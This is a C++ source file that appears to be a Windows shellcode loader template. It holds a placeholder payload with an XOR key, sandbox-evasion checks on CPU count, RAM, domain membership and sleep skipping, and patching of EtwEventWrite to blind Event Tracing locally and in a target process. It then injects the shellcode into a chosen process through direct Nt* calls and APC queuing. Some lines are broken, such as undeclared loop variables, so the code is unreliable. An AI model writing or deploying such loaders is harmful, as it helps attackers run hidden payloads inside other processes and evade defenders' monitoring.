#include <Windows.h>
#include "allcalls.h"
#include "LM.h"
#include <TlHelp32.h>
#include <stdio.h>
#include <vector>
#pragma comment(lib, "netapi32.lib")

// --- Set Payload ---
unsigned char shellcode[] = "SHELLCODE HERE";  // Input 1

size_t shellcode_len = sizeof(shellcode);
char key[] = "ac"; // Input 2 (XOR Key)

// --- XOR Decryption Routine ---
void XOR(char* data, size_t data_len, char* key, size_t key_len) {

	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

void processors() {

	// Check if <X processors
	int minprocs = 2;
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	int numprocs = sysinfo.dwNumberOfProcessors;
	if (numprocs < minprocs) {
		exit(0);
	}
}

void domainJoined() {

	// Check if domain joined
	PWSTR domainName;
	NETSETUP_JOIN_STATUS status;
	NetGetJoinInformation(NULL, &domainName, &status);
	if (status != NetSetupDomainName) {
		exit(0);
	}
}

void ram() {

	// Check if <X RAM
	MEMORYSTATUSEX totram;
	totram.dwLength = sizeof(totram);
	GlobalMemoryStatusEx(&totram);
	if ((float)totram.ullTotalPhys / 1073741824 < 4) {
		exit(0);
	}
}

void skipSleep() {

	// Check if long sleeps fast forwarded
	ULONGLONG uptimebeforesleep = GetTickCount64();
	LARGE_INTEGER Interval;
	Interval.QuadPart = -900000000;
	NtDelayExecution(FALSE, &Interval);
	ULONGLONG uptimeaftersleep = GetTickCount64();

	// If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
	if (uptimeaftersleep - uptimebeforesleep < 75000) {
		exit(0);
	};
}

void patchETW() {

	HANDLE curproc = GetCurrentProcess();
	UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
	size_t size = sizeof(patch);

	unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

	// Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

	DWORD oldprotect;
	LPVOID lpBaseAddress = EEWAddress;
	ULONG NewProtection;

	NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
	NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
	NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

}

void patchETWRemote(HANDLE remoteProc) {

	HANDLE targetProcHandle = remoteProc;

	DWORD oldprotect1;
	ULONG NewProtection1;

	UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
	size_t size = sizeof(patch);

	unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

	LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);
	LPVOID lpBaseAddress = EEWAddress;

	NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
	NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
	NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

}

HANDLE getHandle(int processID) {

	HANDLE targetProcHandle;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	CLIENT_ID cid;
	cid.UniqueProcess = (PVOID)processID;
	cid.UniqueThread = 0;

	NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

	return targetProcHandle;

}


void run(HANDLE targetproc, int procID) {

	PVOID rbuffer = nullptr;
	ULONG old_protect;

	// Init NtOpenThread
	CLIENT_ID cid;
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, 0);

	// Init Iterate Threads
	HANDLE hThread = NULL;

	NtAllocateVirtualMemory(targetproc, &rbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

	//XOR((char*)shellcode, shellcode_len, key, sizeof(key));

	NtWriteVirtualMemory(targetproc, rbuffer, shellcode, shellcode_len, nullptr);
	NtProtectVirtualMemory(targetproc, &rbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);

	
	HANDLE snapshot = CreateToolhelp32Snapshot((TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD), 0);

	THREADENTRY32 t_entry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> tids = std::vector<DWORD>();
	BOOL valid_thread = Thread32First(snapshot, &t_entry);

	while (valid_thread) {
		if (t_entry.th32OwnerProcessID == procID) {
			tids.push_back(t_entry.th32ThreadID);
		}

		valid_thread = Thread32Next(snapshot, &t_entry);

		for (i = 0; i < tids.size(); i++) {

			DWORD tid = tids.at(k);
			cid.UniqueProcess = NULL;
			cid.UniqueThread = (HANDLE)tid;

			NtOpenThread(&hThread, THREAD_ALL_ACCESS, &oa, &cid);
			NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)rbuffer, NULL, NULL, NULL);
			NtClose(hThread);

			}
		}

	NtClose(targetproc);
	
}


// --- MAIN ---
void main(int argc, char** argv) {

	char* holderID = argv[1];
	int PID = atoi(holderID);

	//processors();
	//domainJoined();
	//ram();
	//skipSleep();

	HANDLE target = getHandle(PID);
	patchETW();
	patchETWRemote(target);
	run(target, PID);

}
